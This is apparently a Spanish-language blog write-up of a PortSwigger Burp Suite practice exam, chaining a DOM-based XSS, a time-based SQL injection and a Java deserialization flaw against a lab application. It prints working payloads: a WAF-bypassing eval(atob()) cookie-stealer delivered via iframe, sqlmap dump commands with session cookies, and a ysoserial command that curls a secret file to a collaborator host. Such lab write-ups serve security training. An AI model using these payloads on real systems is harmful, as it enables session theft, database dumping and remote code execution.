@@ -1,0 +1,207 @@
+<h1 id="practice-exam">Practice Exam.</h1>
+
+<p>El examen consta de una aplicación con tres vulnerabilidades que deben de ser explotadas secuencialmente con los siguientes propósitos:</p>
+
+<ol>
+  <li>Robar la cuenta de un usuario sin privilegios.</li>
+  <li>Elevar privilegios a la cuenta del administrador.</li>
+  <li>Robar el flag contenido en el fichero /home/carlos/secret del servidor que hostea la aplicación web.</li>
+</ol>
+
+<p>El tiempo límite son dos horas.</p>
+
+<p><br /></p>
+
+<h3 id="vul1-dom-based-xss">Vul1: DOM-based XSS.</h3>
+
+<p>En primer lugar accedemos a la primera aplicación web del examen y nos encontramos con diversas pestañas, home, Admin panel, My account y Advanced search. Dado el hecho de que tenemos un tiempo limitado para resolver esta aplicación no conviene lanzar un escaneo general de la misma. Por el contrario, las pestañas Admin Panel y Advanced Search están vedadas para el nivel de privilegios que tenemos actualmente.</p>
+
+<p>Así, lanzamos un escaneo sobre la barra de búsqueda de la pestaña “home”. Durante el escaneo se nos informa de la existencia de una vulnerabilidad DOM-Based XSS por lo que recurrimos a la herramienta DOM Invader presente por defecto en el navegador asociado a Burp y buscamos el canario TEST obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613152414.png" text-align="center" />
+</div>
+
+<p>El input se introduce en un código JavaScript en el que podemos intentar introducir un payload. Así, para comprobarlo, intentamos provocar un “alert()” mediante:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="nx">test</span><span class="dl">"</span><span class="s2">:alert(1)}//
+</span></code></pre></div></div>
+
+<p>Con esto lo que hacemos es cerrar el elemento mediante unas comillas y creamos otro separado por una coma cuyo nombre es “test” y cuyo valor es “alert(1)” y finalmente cerramos la estructura javascript y empleamos dos barras para comentar el resto del código. Da resultado con lo que se puede introducir código JavaScript. Ahora para mayor seguridad intentamos hacer que la página nos enseñe las cookies sin éxito debido a que el término “document.cookie” se bloquea mediante un WAF. Así por lo tanto, para evitar este bloqueo, podemos incluir un término encodeado que desencodeamos en el propio payload:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;ciphertext&gt;</span><span class="dl">"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Con ‘eval’ provocaremos que el engine ejecute las funciones siguientes que se encuentren dentro del paréntesis. Con ‘atob’ decodificamos un string encodeado en base64. Así, si eval no es un término que se bloque en el navegador y si el servidor no lleva a cabo una validación del código nuestro payload codificado en base 64 se ejecutará en el navegador de la víctima. Para encodear en linux un texto en base64 empleamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;text&gt;"</span> | <span class="nb">base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span>
+</code></pre></div></div>
+
+<p>Así, encodeamos el término “alert(document.cookie)” en base64 y se lo pasamos como argumento a la función compuesta de ‘eval’ y ‘atob’ obteniendo nuestras cookies en el navegador. Ahora sólo queda encontrar la forma de hacer llegar la respuesta envenenada a una víctima.</p>
+
+<p>Para ello vamos a emplear la funcionalidad del “exploit server” del propio examen de práctica, el cual simula un servidor que hostea una página web que podemos modificar a conveniencia para almacenar código javascrip, html, etc y que entre otras cosas posee una funcionalidad, “Deliver exploit to victim” que simula una víctima que ejecuta cualquier enlace que reciba.</p>
+
+<p>De esta forma, construimos el siguiente código javascript:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="s2">`http://127.0.0.1:8000/?cookie=</span><span class="p">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Esto lo que hace es llevar a cabo una request a una dirección arbitraria con su propia cookie como parámetro en la request. Así, si hiciera una request a un servidor bajo nuestro control, podríamos revisarla mediante el log y obtener el valor del parámetro cookie que podríamos utilizar para robar la sesión. En este caso, vamos a emplear la dirección del servidor del exploit aunque se podría hacer con cualquier otro tipo de servidor.</p>
+
+<p>Así, cambiamos la dirección del servidor del envío de la request y lo encodeamos en base64 como hemos visto antes y se lo pasamos a la barra de búsqueda de la aplicación web como argumento de la función compuesta de ‘eval’ y ‘atob’ y le damos a buscar.</p>
+
+<p>Esto tiene dos propósitos:</p>
+
+<ul>
+  <li>Comporobar que el payload funciona antes de utilizarlo comprobando que en log del servidor de exploit del examen aparece una entrada con nuestra cookie:</li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613155602.png" text-align="center" />
+</div>
+
+<ul>
+  <li>Obtener una URL correctamente encodeada en la barra de navegación que utilizaremos en el servidor del exploit para construir un enlace que provoque que la víctima al ejecutarlo realice una request con el payload malicioso al servidor de la aplicación vulnerable y carge la respuesta maliciosa en una página haciendo así que el navegador de la víctima ejecute nuestro código javascript.</li>
+</ul>
+
+<p>Esto lo conseguimos mediante la etiqueta html “iframe”:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/?SearchTerm=%22%2C%22test%22%3Aeval%28atob%28%22dmFyIHhtbGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsYGh0dHBzOi8vZXhwbG9pdC1hYzRkMWY1NzFmMjlkNDJiYzFlODY5MDMwMWVkMDBhNy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2Nvb2tpZT0ke2RvY3VtZW50LmNvb2tpZX1gLGZhbHNlKTt4bWxodHRwLnNlbmQobnVsbCk7Cg%3D%3D%22%29%29%7D%2F%2F"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>Esto será lo que colocaremos en la sección “Body” del servidor del exploit. Así, al pulsar el botón “Deliver exploit to victim” el examen simulará una víctima que recibirá un enlace que realizará una request via la URL maliciosa (el marco iframe incluye en la página el código html que se incluye en el atributo src de la propia etiqueta) que provocará la ejecución de javascript malicioso proporcionándonos su cookie:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613160126.png" text-align="center" />
+</div>
+
+<p>Esta es la cookie de la víctima y con ella podemos usurpar su sesión cambiando el valor de nuestra cookie de sesión por la suya en nuestro navegador si podemos o en una request al servidor web. Así:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613160313.png" text-align="center" />
+</div>
+
+<p>Como el navegador Chromium de Burp no vuelve permanente el cambio de cookie y tenemos acceso a la contraseña del usuario, copiaremos la contraseña (inspeccionar elemento) y nos logearemos como Carlos para no perder la sesión al mandar otra request al navegador. Así, habríamos terminado la primera vulnerabilidad.</p>
+
+<p><br /></p>
+
+<h3 id="vul2-sql-injection">Vul2: SQL-injection.</h3>
+
+<p>Con la ganancia de una sesión también ganamos acceso al apartado “Advanced search” cuyo contenido antes nos estaba vedado. Con ello, volvemos a lanzar el escaner y se nos informa de una posible vulnerabilidad de SQL injection.</p>
+
+<p>Para asegurarnos lanzamos la herramienta SQLmap mediante el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/filtered_search?SearchTerm=&amp;sort-by=DATE&amp;writer="</span> <span class="nt">-p</span> sort-by <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"_lab=47%7cMC0CFQCHJrZsNthVcY5jbqKhcRpKhgVdVwIUMIZQ4muX7QKzsAVvPjRpaUaH%2f%2b%2bDKS5S0rIote%2bD3AN7%2bPPeWMJI9cNcxcnDrBzfGzs%2fxH3Yvd%2bqidgg9tXa8ux8G6PLZzytbXtTBwCnjaSsNR%2bWhzeFgh7lljzg5iDsdVBKZ6pcOLDa; session=MDlRetGK13F5XKQzKf2wEJ6Nh7WXjcO6"</span> <span class="nt">--dbs</span>
+</code></pre></div></div>
+
+<p>Con ello empleamos sqlmap que realiza un fuzzeo mediante el envío de muchas request con los siguientes modificadores:</p>
+
+<ul>
+  <li><strong>-u</strong>: Para aportar la URL con los parámetros adecuados.</li>
+  <li><strong>-p</strong>: Para aportar el parámetro a testear, por defecto se testean todos pero el escaner de burp nos informa concretamente del término “sort-by”</li>
+  <li>
+    <p><strong>–cookie=</strong>: Para aportar las cookies de sesión, ya que como esta funcionalidad sólo está disponible para determindos usuarios, si no mandamos la sesión las request que mande sqlmap serán bloqueadas por el servidor web.</p>
+  </li>
+  <li><strong>–dbs</strong>: Para obtener todas las bases de datos.</li>
+</ul>
+
+<p>Después de realizar los ajustes adecuados se nos informa de que efectivamente el término “sort-by” es un punto de inyección y además podemos ver que está basado en times-delays:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613161249.png" text-align="center" />
+</div>
+
+<p>Así, termina diciendonos que hay una base de datos que se llama ‘public’, de forma que, seguimos profundizando y en el comando anterior cambiamos <strong>–dbs</strong> por <strong>-D public –tables</strong> para recuperar todas las tablas de la base de datos ‘public’.</p>
+
+<p>Nos informa de que existen tres tablas: comments, posts y users. Evidentemente, nos interesa la tabla ‘users’. Así, nos disponemos a sacar el contenido de dicha tabla mediante <strong>-D public -T users –dump</strong> en lugar de <strong>-D public –tables</strong>.</p>
+
+<p>Finalmente obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163240.png" text-align="center" />
+</div>
+
+<p>Así, nos logeamos a la cuenta del administrador.
+<br /></p>
+
+<h3 id="vul3-java-deserialization">Vul3: Java Deserialization.</h3>
+
+<p>Con la ganancia de las nuevas credenciales hemos ganado acceso a una nueva parte de la aplicación web que es el “Admin panel”. Al revisar las cookies podemos observar que tenemos una cookie: admin_pref.</p>
+
+<p>En el escaner obtenemos que se trata de una vulnerabilidad de objeto serializado de Java:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164533.png" text-align="center" />
+</div>
+
+<p>Para verificarlo empleamos el auto-decodificador online: “CyberChef” y observamos que secuencialmente lo decodifica de URL &gt; Base64 &gt; GZip.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163510.png" text-align="center" />
+</div>
+
+<p>Así, lo llevamos al decodificador de BurpSuite para intentar ver su contenido decodificándolo en URL &gt; Base64 y Gzip:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163621.png" text-align="center" />
+</div>
+
+<p>Podemos observar que se trata de un objeto serializado de Java. Para explotar esta vulnerabilidad vamos a emplear la herramienta “Java Deserialization Scanner” disponible desde Extender &gt; BAppStore en burpsuite. Para configurarlo necesitamos además Ysoserial disponible desde el enlace: https://github.com/frohoff/ysoserial del cual tenemos que descargarnos el JitPack. Una vez descargado debemos condigurar el path para Burp:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163916.png" text-align="center" />
+</div>
+
+<p>De esta forma, capturamos una request que contenga dicha cookie y lo enviamos al Deserialization Scanner:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164032.png" text-align="center" />
+</div>
+
+<p>Primero llevamos a cabo un “Manual testing”, seteamos el “Set Insertion point” subrayando la cookie de admin_pref</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164632.png" text-align="center" />
+</div>
+
+<p>Y seguidamente ponemos que es un objeto comprimido en gzip, que luego se encodea en base64 y luego en URL:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164702.png" text-align="center" />
+</div>
+
+<p>Los resultados que aparecen a la izquierda nos informa de posibles vulnerabilidades:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164738.png" text-align="center" />
+</div>
+
+<p>En Apache CommonsCollections3.</p>
+
+<p>Así, vamos a la pestaña exploiting de la propia herramienta y repetimos los pasos: Configuramos la cookie como punto de inyección y seteamos la secuencia de codificación GZip &gt; Base64 &gt; URL.</p>
+
+<p>En esta pestaña podremos emplear el payload a enviar a través de Ysoserial definiendo el tipo de objeto (CommonsCollection1, 2, etc) y el comando a ejecutar. En este caso, para estar seguros de que el payload se ejcuta vamos a intentar hacer una conexión con un sistema bajo nuestro control, esto es, un host con BurpCollaborator para asegurarnos de que se ejecuta nuestro payload:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613165116.png" text-align="center" />
+</div>
+
+<p>Al probarlo con CommonsCollections1 no funciona, seguimos probando hasta el CommonsCollection6, entonces:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613165251.png" text-align="center" />
+</div>
+
+<p>Así, terminamos empleando el siguiente comando a modo de payload en la sección de “Exploiting”:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CommonsCollections6 <span class="s1">'curl --data @/home/carlos/secret axbbfl7fa1w5zuw5zgf77qg6yx4nsc.oastify.com'</span>
+</code></pre></div></div>
+
+<p>Lanzamos el ataque y vemos que en nuestro burp collaborator hay un HTTP request con el contenido del fichero:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613165706.png" text-align="center" />
+</div>
+
+<p>Lo emitimos como solución y abríamos terminado la primera app del examen.</p>
+
